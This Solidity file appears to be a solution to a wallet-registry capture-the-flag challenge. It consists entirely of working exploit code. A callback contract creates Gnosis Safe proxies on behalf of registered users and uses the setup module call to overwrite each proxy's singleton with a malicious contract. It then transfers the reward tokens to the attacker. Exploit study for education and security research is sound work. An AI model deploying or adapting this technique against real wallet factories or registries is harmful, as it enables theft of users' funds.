// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import "./WalletRegistry.sol";
import "hardhat/console.sol";

contract BackDoorAttacker is IProxyCreationCallback{

    GnosisSafeProxyFactory private _gnosisSafeProxyFactory;
    WalletRegistry private _walletRegistry;

    MoudleMaliciousContract private _moudleMaliciousContract;
    MoudleRelatedImplContract private _moudleRelatedImplContract;

    address private _token;
    address[] private _users; 
    address private _player;

    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        
        // was used by `setupModules(to, data);`
        bytes memory moudleData =  abi.encodeWithSignature("changeGnosisSafeProxySingleton(address)", address(_moudleMaliciousContract));  
        
        for(uint i=0;i< _users.length;i++){
            address[] memory _users2 = new address[](1);
            _users2[0] = _users[i];
             // function setup(
            //     address[] calldata _owners,
            //     uint256 _threshold,
            //     address to,
            //     bytes calldata data,
            //     address fallbackHandler,
            //     address paymentToken,
            //     uint256 payment,
            //     address payable paymentReceiver
            // ) external {
            bytes memory userBytes =  abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", _users2,1,address(_moudleRelatedImplContract),moudleData,address(0),address(0),0,address(0));    
            GnosisSafeProxy proxyCreate = _gnosisSafeProxyFactory.createProxyWithCallback(singleton, userBytes, i, _walletRegistry);
            MoudleMaliciousContract(payable(proxyCreate)).transferTokenFromProxyToPlay(_token,_player);
        }
         
    }

    // walletFactor ==> GnosisSafeProxyFactory
    // singleton    ==> GnosisSafe 
    function attack(address walletFactor,address walletRegistry,address singleton,address tokenAddress,address[] calldata users) external {

        _gnosisSafeProxyFactory = GnosisSafeProxyFactory(walletFactor);
        _walletRegistry = WalletRegistry(walletRegistry);

        _moudleMaliciousContract = new MoudleMaliciousContract();
        _moudleRelatedImplContract = new MoudleRelatedImplContract();
        _token = tokenAddress;

        _users = users;
        _player = msg.sender;

        // random data, no matter
        // doing check the initializer params
        bytes memory initializer= "0x"; 
        uint256 saltNonce = 1;

        // original attack
        _gnosisSafeProxyFactory.createProxyWithCallback(singleton, initializer, saltNonce, IProxyCreationCallback(address(this))); // address(this) first call callback as this Attacker contract 

    }
}

import "solady/src/utils/SafeTransferLib.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

// this contract should compatible with GnosisSafe, Because after creatProxy, there are some checks for the related states.
contract MoudleMaliciousContract is 
    EtherPaymentFallback,
    Singleton,
    ModuleManager,
    OwnerManager,
    SignatureDecoder,
    SecuredTokenTransfer,
    ISignatureValidatorConstants,
    FallbackManager,
    StorageAccessible,
    GuardManager{

    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    // when proxy call blew function, the caller is proxy.
    function transferTokenFromProxyToPlay(address token,address player) external{

            SafeTransferLib.safeTransfer(
                address(token),
                player,
                PAYMENT_AMOUNT
            );
    }

}

// When calling the setup(GnosisSafe),  setupModules(to, data) will using below contract change the singleton as MoudleMaliciousContract 
contract MoudleRelatedImplContract{

    address internal singleton;

    function changeGnosisSafeProxySingleton(address newSingleton) external {
        singleton = newSingleton;
    }
}
